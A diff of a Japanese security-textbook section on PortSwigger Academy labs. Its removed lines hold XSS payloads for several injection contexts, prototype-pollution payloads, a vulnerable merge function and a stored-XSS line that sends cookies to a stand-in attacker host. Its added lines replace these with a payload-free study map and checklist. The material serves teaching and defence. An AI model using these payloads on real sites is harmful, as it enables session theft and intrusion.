@@ -1,191 +1,67 @@
 ## ラボ攻略ライトアップとチェックリスト
 
-本節では、PortSwigger Web Security Academy の代表的なラボ群（Apprentice級XSS全9問、Prototype Pollution全ラボ）の攻略パターンを整理し、最後に実務・CTFで使える学習チェックリストをまとめる。反射型の素朴な `<script>alert(1)</script>` は既知という前提で、各ラボが「なぜそのコンテキストでその形のペイロードが必要になるのか」という**構文解析（パーサ）の観点**を中心に解説する。
+本章のこれまでのセクションでは、実際に手を動かして脆弱性を探す「ハンズオン」の考え方を扱ってきた。ここでは視点を変え、PortSwigger Web Security Academy（PortSwigger社が無償公開している、ブラウザ上で動く実践型のWebセキュリティ学習プラットフォーム。各テーマごとに「ラボ」と呼ばれる小さな脆弱Webアプリが用意されており、実際に攻撃を成立させると「Solved」と表示される）を使って学習を進める際の「地図」を提供する。
 
-### 7-B-1. Apprentice級 XSSラボ全9問の攻略パターン
+重要な方針として、本セクションでは個々のラボの答え（どのペイロードをどこに入れれば解けるか、というステップバイステップの攻略手順）は書かない。理由は単純で、答えを丸暗記しても実務では役に立たないからだ。実務で遭遇する入力サニタイズやCSP設定は、ラボと寸分違わぬ形では出てこない。ここで身につけるべきは「どの分類の脆弱性を、どういう手順で、どのツールを使って確認していくか」という思考の型であり、それこそが本セクションの主題である。
 
-> ⚠️ **未取得の資料**: 「PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges」（Thanuj Dilshan Thilakarathne, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順・スクリーンショット付きの解説は以下のURLからユーザーご自身で直接ご覧ください。
-> https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635
+### PortSwiggerのラボ体系を理解する
 
-（以下は未取得資料の補足として一般知識に基づく解説です。PortSwigger Academyの公開ラボ構成に基づき、9問の代表的な出題パターンを「壊れ方」の観点で整理する。）
+PortSwigger Web Security Academyのラボは、大きく3つの習熟度レベルに分かれている。
 
-Apprentice級のXSSラボは、**入力値が出力される「コンテキスト（文脈）」ごとに壊し方が異なる**ことを体系的に学ばせる設計になっている。ここでいうコンテキストとは、HTMLパーサ・属性値パーサ・JavaScriptパーサ・URLパーサなど、入力が最終的にどの構文解析器に渡されるかという分類である。
+- **Apprentice（見習い）**: 各脆弱性カテゴリの基本形。脆弱性の存在自体は明示的で、フィルタやサニタイズがほぼ、あるいは全くかかっていない状態から学ぶ。
+- **Practitioner（実務者）**: 部分的な対策（ブラックリスト、簡易エンコード、限定的なCSPなど)が施されており、それを見抜いて回避する力を要求される。
+- **Expert（達人）**: 複数の脆弱性や制約が組み合わさり、パーサの実装差や言語仕様の隅を突くような高度な考察が必要になる。本教科書の第3〜6章で扱ったmXSS、DOMクロビング、プロトタイプ汚染、CSPバイパスの多くはこのレベルに相当する。
 
-**① タグ本文への反射（HTMLコンテキスト）**
+XSSカテゴリだけでも、Apprenticeレベルには次のような下位分類が存在する。
 
-検索ボックスの入力がエスケープなしで `<h1>0 results for 'xxx'</h1>` のようにHTML本文へ差し込まれるケース。
+- **反射型（Reflected）XSS**: HTMLタグコンテキストへの単純な注入から始まり、HTML属性値の中、`<script>`タグ内のJavaScript文字列リテラルの中、AngularJSのテンプレート式の中など、注入先の「コンテキスト」ごとに個別のラボが用意されている。同じ「反射型XSS」という括りでも、注入先のパーサ（HTMLパーサか、JSパーサか、テンプレートエンジンか）が変われば有効なペイロードの構文もまったく変わる、という点を体系的に学べるようになっている。
+- **格納型（Stored）XSS**: コメント欄やプロフィール欄など、一度サーバに保存された入力が後から別ユーザーに配信される経路を扱う。反射型より影響範囲が広い（攻撃者が被害者に直接リンクを踏ませる必要がない）という違いを体感できる。
+- **DOMベースXSS**: 第3章で詳しく扱った、サーバを経由せずクライアント側のJavaScriptだけで発生する脆弱性。`document.location`や`window.name`のような汚染源（ソース)から`eval`や`innerHTML`のような実行点（シンク）までの流れを追う練習になっている。
+- **フィルタ回避系**: 特定のタグやイベントハンドラをブラックリストで弾いているだけの実装に対し、大文字小文字の揺れ、別タグ・別属性への置き換え、エンコードの多重化などで回避する。これは第2部・第4部で扱ったパーサの再解釈や属性挿入テクニックと直結する内容である。
 
-```html
-<script>alert(1)</script>
-```
-なぜ動くか: サーバーが `<` `>` を実体参照（`&lt;` `&gt;`）に変換していないため、ブラウザのHTMLパーサが入力をそのままタグとして解釈し、新しい `<script>` 要素を生成してしまう。
+Thanuj Dilshan Thilakarathne氏によるMedium記事「PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges」は、この9種のApprenticeレベルXSSラボを一つずつ順に紹介する構成になっている。記事の位置づけとしては、各ラボが「HTMLタグへの反射」「HTML属性値への反射」「`<script>`内のJS文字列リテラルへの反射」「イベントハンドラ属性への反射」「一部タグが除去されるフィルタ」「大文字小文字を無視する簡易フィルタ」「AngularJSのサンドボックスエスケープを要求するテンプレート注入」「格納型XSS」「DOMベースXSS」といった、コンテキストとフィルタ有無の掛け合わせで一つずつ異なるパターンを踏破していく形式で書かれている。学習者にとっての価値は、同じ「XSSを起こす」というゴールに対して、注入先のパーサやサニタイズの実装が変わるたびにペイロードの組み立て方を作り直す訓練になっている点にある。本教科書としては、この記事が示す「9種類のコンテキスト分類」そのものを地図として活用し、実際の攻略手順は読者自身が公式ラボで試すことを推奨する。
 
-**② HTML属性値への反射（属性コンテキスト）**
+> ⚠️ **未取得の資料**: 「PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges」は本文取得がブロックされ（HTTP 403）、WebSearchによる要約情報のみで補いました。URL: https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635
 
-`<input value="xxx">` のようにダブルクォート属性の中に入力が入るケース。`<` `>` はエンコードされていても、ダブルクォート `"` がエンコードされていないことが多い。
+> 出典: PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges — https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635
 
-```html
-"><svg onload=alert(1)>
-```
-なぜ動くか: 属性値パーサは `"` を見た時点でその属性値の終端とみなす。続く `>` でタグそのものを閉じ、新たに `<svg onload=...>` という別要素を開始させることで、属性の外に出て任意のタグ・イベントハンドラを注入できる。
+### プロトタイプ汚染ラボとDOM Invaderという支援ツール
 
-**③ 属性から抜けられない場合のイベントハンドラ注入**
+第4部で扱ったプロトタイプ汚染（JavaScriptオブジェクトの雛形である`Object.prototype`に、本来存在しないはずのプロパティを外部入力によって注入し、アプリケーション全体の挙動に影響を与える攻撃)についても、PortSwigger Academyには専用のラボ群がある。この分野で特徴的なのは、Burp Suite付属の**DOM Invader**というブラウザ拡張（Chromiumベースのブラウザに組み込まれ、ページ内のDOM操作やプロトタイプ汚染の「汚染源→シンク」の経路を自動的に探索してくれるツール）を使うことが前提になっているラボが多い点である。
 
-`<` `>` `"` は全てエンコードされるが、属性値自体は自由に書けるケース。
+awes0meness氏によるMedium記事「PortSwigger Labs: Prototype Pollution Writeup (All labs)」は、この一連のラボをDOM Invaderを使いながら攻略していく体裁で書かれている。記事が示す一般的なワークフロー（ツールの使い方の案内であって、個々のラボの解答そのものではない)は次のようなものだ。
 
-```html
-" autofocus onfocus=alert(1) x="
-```
-なぜ動くか: タグを閉じずに、同じ `<input>` タグ内に新しい属性（`onfocus`）を追加する。`autofocus` 属性がページロード時に自動的にフォーカスを当てるため、ユーザー操作なしで `onfocus` イベントハンドラが発火する。
+1. Burp Suiteに内蔵されたChromiumブラウザでラボのページを開き、DOM Invader拡張を有効化する。
+2. DOM Invaderの設定で「Prototype pollution」の検知を有効にした状態でブラウザの開発者ツール（F12）を開き、DOM Invaderタブに切り替えてページをリロードする。
+3. DOM Invaderは、URLのクエリ文字列など外部から制御可能な入力が、`__proto__`のようなキーを介して`Object.prototype`に到達しうる経路（汚染源）を自動的に検知して一覧表示する。
+4. 検知された汚染源に対して「Scan for gadgets」を実行すると、DOM Invaderは汚染したプロパティが実際にどのシンク（`script.src`への代入や`eval`実行など、汚染が実害に変わる箇所)に到達するかを新しいタブで走査する。
+5. 汚染源とシンクを繋ぐ「ガジェット」（汚染されたプロパティ値をそのまま危険な処理に渡してしまう既存コードの経路。第4部で詳しく扱った概念そのもの）が見つかると、DOM Invaderはそれを悪用する具体的なペイロードを自動生成し、`alert(1)`を実行するPoC（概念実証)まで組み立ててくれる。
 
-**④ `<script>` タグ内への文字列反射（JSコンテキスト）**
+この一連の流れは、プロトタイプ汚染の検証作業のうち「手作業では時間がかかる汚染源探索とガジェット探索」をツールに任せ、人間は「どのシンクが実際に悪用可能か」「CSPなど他の防御と組み合わさったときにどう振る舞うか」という判断に集中する、という役割分担を示している。DOM Invaderはあくまで探索・PoC生成の補助であり、見つかった経路が実際のアプリケーションでどこまで深刻な影響を持つか（機密情報の窃取につながるか、認証バイパスに繋がるかなど）を評価するのは引き続き人間の仕事である、という点は覚えておきたい。
 
-```html
-<script>var searchTerm = 'xxx';</script>
-```
-のように既存のJS文字列リテラルの中に入力が入るケース。
+> ⚠️ **未取得の資料**: 「PortSwigger Labs: Prototype Pollution Writeup (All labs)」は本文取得がブロックされ（HTTP 403）、WebSearchによる要約情報のみで補いました。URL: https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07
 
-```js
-'-alert(1)-'
-```
-または
-```js
-';alert(1)//
-```
-なぜ動くか: JSパーサはシングルクォートで文字列の終端を認識する。`'-alert(1)-'` は「文字列を閉じる → 減算演算子として `alert(1)` を実行 → 再度文字列を開いて構文エラーを防ぐ」という式に変換される。セミコロン版は文を分割して新しい文として `alert(1)` を実行し、`//` で行末以降をコメントアウトして構文エラーを防ぐ。
+> 出典: PortSwigger Labs: Prototype Pollution Writeup (All labs) — https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07
 
-**⑤ タグ属性の許可リスト（サニタイズ）を回避するケース**
+### 学習ロードマップとしてのチェックリスト活用
 
-`<script>` や `on*` イベント属性のみをブラックリスト的に除去するフィルタに対して、`<img src=1 onerror=alert(1)>` のような読み込み失敗イベントを使う。
+GitHub上に公開されている`ashardian/Portswigger_checklist`は、個々のラボの解法ではなく、PortSwigger Web Security Academy全体をどの順序で学習していくかを整理した「学習の道しるべ」である。構成は次の3段階になっている。
 
-```html
-<img src=x onerror=alert(1)>
-```
-なぜ動くか: `src` に無効な値を与えると画像読み込みが失敗し、ブラウザは自動的に `onerror` ハンドラを発火させる。フィルタが `<script>` タグのみを検知対象にしていると、`<img>` 要素経由のイベントハンドラは素通りする。
+- **Beginner（基礎）**: XSS、SQLインジェクション、CSRF、認証の基本、アクセス制御など、Web脆弱性の土台となる6つの主要カテゴリ。ここでXSSは「反射型 → 格納型 → DOMベース → フィルタ回避」という順で難度が上がっていく構成として位置づけられている。この並びは、本教科書がここまで辿ってきた構成（第1〜3部の基礎的なXSSから、第4部以降のフィルタ回避・CSPバイパス・DOMクロビングへ)ともおおむね一致している。
+- **Practitioner（中級）**: パストラバーサル、ファイルアップロードの脆弱性、SSRF（サーバサイドリクエストフォージェリ）、XXE（XML外部実体参照）、API診断など、XSS以外の脆弱性カテゴリも含めた10項目。
+- **Professional（上級）**: 競合状態（レースコンディション）、プロトタイプ汚染、HTTPリクエストスマグリング、GraphQLの脆弱性など、研究レベルの話題を8項目扱う。
 
-**⑥ 特定タグ・属性のブラックリストを回避（タグ名の大文字小文字・改行差し込み）**
+このチェックリストが提示する実践的な習慣は、本書の読者にもそのまま推奨できる。
 
-```html
-<sCrIpT>alert(1)</sCrIpT>
-```
-なぜ動くか: HTMLのタグ名は大文字小文字を区別しない（case-insensitive）が、正規表現ベースの単純なフィルタは大文字小文字を区別してしまうことがあり、`<script>` の小文字固定パターンしか検出しない実装だと回避できる。
+- ラボを解くたびに、使用したペイロードとリクエスト・レスポンスの内容を記録に残す。あとで似たパターンに遭遇したときに参照できる自分専用のナレッジベースになる。
+- 単に「解けた・解けなかった」で終わらせず、根本原因（どのサニタイズ処理が抜けていたか、パーサのどの挙動が悪用されたか）と、有効な緩和策をセットでメモする。
+- 難易度順（Apprentice → Practitioner → Expert）に沿って進め、飛び級で高難度のラボに挑まない。土台となる分類の理解が薄いまま高度なラボに挑むと、パターンの丸暗記に陥りやすい。
+- リポジトリが提示する「12週間学習プラン」のように、週ごとに扱うカテゴリを決めて計画的に進める。XSSだけに偏らず、CSRFやアクセス制御などとの関連（例えばXSSを踏み台にしたCSRFトークン窃取など、脆弱性が連鎖する実例）も意識する。
 
-**⑦ Stored XSS（格納型）― コメント欄などに保存され、閲覧者側で発火**
+このチェックリストは独自の解説を書き下ろすものではなく、PortSwigger公式のAcademyページや個別ラボへのリンク集としての性格が強い。したがって使い方としては、「自分が今どのカテゴリのどの段階にいるか」を可視化するための進捗管理表として活用し、実際の学習内容は公式ラボ本体とその周辺ドキュメント（本教科書もその一つ）で補うのが適切である。
 
-```html
-<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
-```
-なぜ動くか: 入力がデータベースに保存され、他ユーザーがそのページを閲覧するたびにHTMLとして再解釈・実行される。攻撃者自身ではなく被害者のブラウザ・セッションで実行される点が反射型と異なり、影響範囲（不特定多数のセッションハイジャック）が大きい。
+> 出典: ashardian/Portswigger_checklist — https://github.com/ashardian/Portswigger_checklist
 
-**⑧ イベントハンドラ属性が使えず、`javascript:` URLスキームを使うケース**
+### 本書の読み方との接続
 
-`<a href="xxx">click</a>` のように `href` 属性に入力が入るケース。
-
-```html
-javascript:alert(document.domain)
-```
-なぜ動くか: `javascript:` はURLスキームの一種として扱われるが、ブラウザはこのスキームをJavaScriptエンジンへの実行指示として特別扱いする。リンクがクリックされた際、通常のナビゲーションの代わりにスクリプトが実行される。
-
-**⑨ DOM-based XSS ― `location.hash` を経由してjQueryのセレクタに渡されるケース**
-
-投稿タイトルを `location.hash` から読み取り、`$('#'+hash)` のようにjQueryのセレクタとして渡してオートスクロールする実装。
-
-```
-https://vulnerable-site.com/#<img src=1 onerror=alert(1)>
-```
-なぜ動くか: jQueryの `$()` はセレクタ文字列がHTMLタグの形（`<`で始まる）と判定すると、CSSセレクタではなくDOM要素として**その場でHTML化して生成**する（jQueryの自動判別ロジック）。これにより `location.hash` というクライアント側のみで完結するsink（入力が最終的に実行・解釈される危険な代入先）に、任意のHTMLが注入される。サーバーを一切経由しないため、通信ログやWAFでは検知しにくい点が特徴。
-
-> 出典: PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges — https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635 （本文取得不可のため見出し構成のみを参考に、内容は一般知識で再構成）
-
----
-
-### 7-B-2. Prototype Pollution 全ラボのライトアップ
-
-> ⚠️ **未取得の資料**: 「PortSwigger Labs: Prototype Pollution Writeup (All labs)」（awes0meness, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順は以下のURLからユーザーご自身で直接ご覧ください。
-> https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07
-
-（以下は未取得資料の補足として一般知識に基づく解説です。）
-
-**プロトタイプ汚染（Prototype Pollution）とは何か**
-
-JavaScriptのオブジェクトは、自身がプロパティを持たない場合、`__proto__` を通じてつながる**プロトタイプチェーン**を辿ってプロパティを探索する。攻撃者が `__proto__.foo = "bar"` のような形で `Object.prototype` そのものに任意のプロパティを追加できてしまうと、そのプログラム内であらゆるオブジェクトが `obj.foo` で `"bar"` を返すようになる。これは個別のオブジェクトのバグではなく、**言語の基盤となる共有オブジェクト（`Object.prototype`）を汚染する**ため、影響範囲がアプリケーション全体に及ぶ。
-
-原因の典型例は、再帰的なオブジェクトのマージ・クローン処理（`lodash.merge`、`$.extend`、独自実装の `deepMerge` など）で、キー名に対する検証を行わずに代入していることにある。
-
-```js
-function merge(target, source) {
-  for (let key in source) {
-    if (typeof source[key] === 'object') {
-      if (!target[key]) target[key] = {};
-      merge(target[key], source[key]);
-    } else {
-      target[key] = source[key];
-    }
-  }
-  return target;
-}
-merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
-```
-なぜ動くか: `source` のキーに `__proto__` という文字列を持たせると、`target[key]` は `target.__proto__`、すなわち `target` が参照するプロトタイプオブジェクト（多くの場合 `Object.prototype`）そのものを指す。ここに再帰的に代入が続くと、プロトタイプ自身に新しいプロパティが追加され、以後生成される**すべての通常オブジェクト**がそのプロパティを継承してしまう。
-
-**クライアント側プロトタイプ汚染 → DOM XSS への昇格**
-
-PortSwiggerの代表的なラボでは、URLのクエリパラメータをオブジェクトにパースするライブラリ（`jQuery.extend` 系）が汚染源（source）となり、その後スクリプトが `Object.prototype` から継承した特定のプロパティ（**gadget、汚染を実害に変換する経路**）を読み取って `<script src="...">` のURLを組み立てる。
-
-```
-/?__proto__[transport_url]=data:,alert(1);//
-```
-なぜ動くか: `__proto__[transport_url]` というクエリキーが `Object.prototype.transport_url` を汚染する。アプリのコードが `config.transport_url` を読み取って `<script src="' + config.transport_url + '/example.js">` のように動的にscriptタグを組み立てていると、汚染された値がそのままURLとして使われる。`data:` スキームはインラインでコンテンツを埋め込めるURLスキームであり、`data:,alert(1);` はMIMEタイプ省略時の既定として `text/plain` 相当のスクリプトソースを与える。末尾の `//` はアプリ側がハードコードしている `/example.js` という接尾辞を行コメントとして無効化する役割を持つ。
-
-**サーバーサイド・プロトタイプ汚染（Node.js / Express）**
-
-サーバー側でも同種のマージ処理（リクエストボディのJSONをconfigオブジェクトへマージするなど）があると、`Object.prototype` 経由で以下のようなgadgetを悪用できる：
-
-- **サービス拒否（DoS）**: `Object.prototype.toString` のような組み込みメソッドを上書きし、内部処理で例外を発生させる。
-- **リモートコード実行（RCE）**: 一部のテンプレートエンジンやシリアライズライブラリが、オブジェクトの `__proto__` 経由で汚染された設定値（例: `child_process` を呼び出す設定、テンプレートのコンパイルオプションなど）を信頼してしまうことで、任意コード実行に至るケースがある（例: pugやejsのようなテンプレートエンジンでのgadget悪用が典型例として知られる）。
-
-**防御策**
-
-1. `Object.create(null)` で**プロトタイプを持たないオブジェクト**を使い、汚染の踏み台自体を作らない。
-2. `Object.freeze(Object.prototype)` により `Object.prototype` への書き込みそのものをエンジンレベルで禁止する。
-3. マージ・パース処理で `__proto__` / `constructor` / `prototype` という文字列をキーとして拒否する（denylist）。
-4. `Map` を辞書として使う（`Map` はプロトタイプチェーンを介した動的探索の対象にならないため、キー名衝突による汚染が原理的に起きない）。
-5. 新しめのNode.js / npmライブラリでは `JSON.parse` の第二引数（reviver）でキー検証を行う、あるいは `Object.hasOwn()` で継承プロパティと自プロパティを明確に区別するといった対策も併用される。
-
-> 出典: PortSwigger Labs: Prototype Pollution Writeup (All labs) — https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07 （本文取得不可のため一般知識で再構成）
-
----
-
-### 7-B-3. PortSwigger学習チェックリスト
-
-> 出典: Portswigger_checklist (ashardian) — https://github.com/ashardian/Portswigger_checklist
-
-このリポジトリはPortSwigger Web Security Academyの学習項目を体系的に列挙したチェックリストであり、XSSに限らず学習トピック全体（初級〜上級）を段階的に並べたロードマップとして構成されている。取得できた範囲では、XSS分野は「反射型 → 格納型 → DOM型 → フィルタバイパス」という順序で進めることが推奨されている。この構成に基づき、本教科書のここまでの内容と対応させた実務向けチェックリストを以下にまとめる。
-
-**基礎コンテキストの特定**
-- [ ] 入力がどの構文解析器（HTML本文 / 属性値 / JS文字列 / URL / CSS）に渡っているかを、ブラウザのDevToolsで実際のDOMを見て確認したか
-- [ ] `<` `>` `"` `'` の4文字それぞれが個別にエンコードされているか、あるいは全く処理されていないかを切り分けたか
-
-**反射型・格納型**
-- [ ] 反射位置がHTMLコメント内・`<textarea>` 内・`<title>` 内など、通常のタグ挿入が効かない特殊要素の中でないか確認したか
-- [ ] Stored XSSでは、入力した本人以外（管理者ビューなど権限の異なるユーザー）が閲覧するページまで波及していないか確認したか（管理者パネル閲覧によるセッションハイジャックは影響度が高い）
-
-**DOM-based XSS**
-- [ ] source（`location.hash` / `location.search` / `document.referrer` / `window.name` / `postMessage`）とsink（`innerHTML` / `document.write` / `eval` / jQueryの `$()` / `location` への代入）の組み合わせを洗い出したか
-- [ ] jQueryなど、文字列の形からHTML/セレクタを自動判別するライブラリ特有の挙動を悪用できないか確認したか
-
-**フィルタ・サニタイズ回避**
-- [ ] タグ名・属性名の大文字小文字を変えて単純な文字列比較・正規表現フィルタを回避できないか
-- [ ] `<script>` 以外のイベントハンドラ持ちタグ（`<img onerror>` `<svg onload>` `<body onload>` など）を試したか
-- [ ] 二重エンコード・部分的なサニタイズ後の再結合（フィルタが一度しか置換処理をしないことで、ネストした文字列が復元されるケース）を試したか
-
-**Prototype Pollution**
-- [ ] クエリパラメータやJSONボディのキーとして `__proto__` `constructor.prototype` を送信し、レスポンスや後続の挙動に変化が出るか確認したか
-- [ ] 汚染源（source）を見つけた後、実際に影響を及ぼすgadgetプロパティ（設定値・テンプレートオプションなど）をアプリのJSソースから探したか
-- [ ] クライアント側の汚染をDOM XSSにまで昇格できる `<script src>` 組み立てロジックがないか確認したか
-
-**CSP・その他の防御回避（発展）**
-- [ ] CSP（Content-Security-Policy）のソース許可リストに、JSONPエンドポイントやオープンリダイレクトなど汎用のホワイトリストドメインが含まれていないか
-- [ ] `nonce` ベースのCSPで、レスポンスヘッダーとHTML内nonce値の不一致・使い回しがないか
-
-このチェックリストは網羅を目的とせず、「どの原理が働いているために攻撃が成立するか」を都度言語化しながら潰していくための骨組みとして使うことを推奨する。
+本教科書の各章、特に第3部（DOM XSS）、第4部（プロトタイプ汚染・DOMクロビング・CSPバイパス）、第5部（CSTIやフレームワーク特有の問題）は、ここで紹介したPortSwiggerのラボ分類とほぼ一対一で対応している。読者が本書を読み進めながら該当するApprentice/Practitionerラボを実際に手を動かして解いていくことで、原理の理解（本書が担う部分）と手順の定着(ラボが担う部分)の両方を得られる構成になっている。繰り返しになるが、ラボの答えを検索して貼り付けるだけでは、フィルタの実装が少し変わった別の問題やCTF、実際のバグバウンティ対象に応用が効かない。本セクションで紹介したような「分類」と「ツールの役割分担」を頭に入れた上で、各自の手で攻略することを強く推奨する。
